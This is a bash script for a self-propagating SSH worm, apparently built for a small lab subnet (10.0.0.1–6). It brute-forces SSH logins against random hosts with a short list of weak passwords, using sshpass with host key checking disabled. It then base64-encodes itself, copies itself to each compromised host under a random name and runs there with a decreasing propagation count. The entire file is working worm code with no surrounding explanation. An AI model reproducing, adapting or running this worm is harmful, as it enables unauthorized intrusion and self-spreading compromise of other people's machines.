#!/bin/bash

if [ "$1" -eq "0" ]; then
	exit
fi

# Variables to complete (i.e. IP addressing scheme and worm location)
IP_SUBNET="10.0.0."
MIN_HOST=1
MAX_HOST=6
WORM="$0"
PROPAGATION=$1

if [ "$PROPAGATION" -ne "1" ]; then
	VICTIM_PROPAGATION=`expr $PROPAGATION - 1`
else
	VICTIM_PROPAGATION=1
fi


# Data to use in the brute force attack
USER="test"
PASSWORDS=("user" "test" "admin")


# Other variables
NUM_HOSTS=`expr $MAX_HOST - $MIN_HOST + 1`
MY_IP="`hostname -I`"
IPS=()
SEED=`expr $RANDOM % $NUM_HOSTS`
ENCODED=`cat $WORM | base64`
NEW_NAME="$RANDOM.sh"


# Creation of the IPv4 addresses of the hosts
for HOST in $(seq $MIN_HOST $MAX_HOST)
do
	IPS+=("${IP_SUBNET}${HOST}")
done


# Randomly choose the target, but it cannot be the attacker
IP=${IPS[$SEED]}
if [ $IP = $MY_IP ]; then
	SEED=`expr $SEED + 1`
	SEED=`expr $SEED % $NUM_HOSTS`
	IP=${IPS[$SEED]}
fi
# echo "[ $MY_IP] The target IP is $IP"


# Brute force against the other hosts
for VICTIM in $(seq $PROPAGATION)
do
	echo "[ $MY_IP] The target IP of the propagation number $VICTIM is $IP"
	for PASS in "${PASSWORDS[@]}"
	do
		# echo "[ $MY_IP] Trying user = $USER with password = $PASS"

		# Execute the worm on the remote host using sshpass
		sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@$IP \
			"echo \"$ENCODED\" | base64 -d > \$HOME/$NEW_NAME ; \
			chmod +x \$HOME/$NEW_NAME ; \
			sleep 10s ; \
			./$NEW_NAME $VICTIM_PROPAGATION" 2> /dev/null

		if [ $? -eq 0 ]; then
		    echo "[ $MY_IP] SSH Infection at $IP SUCCEEDED!"
		    break
		fi
	done
	
	# Obtain the next victim
	SEED=`expr $SEED + 1`
	IP=${IPS[$SEED]}
	if [ $IP = $MY_IP ]; then
		SEED=`expr $SEED + 1`
		SEED=`expr $SEED % $NUM_HOSTS`
		IP=${IPS[$SEED]}
	fi
done



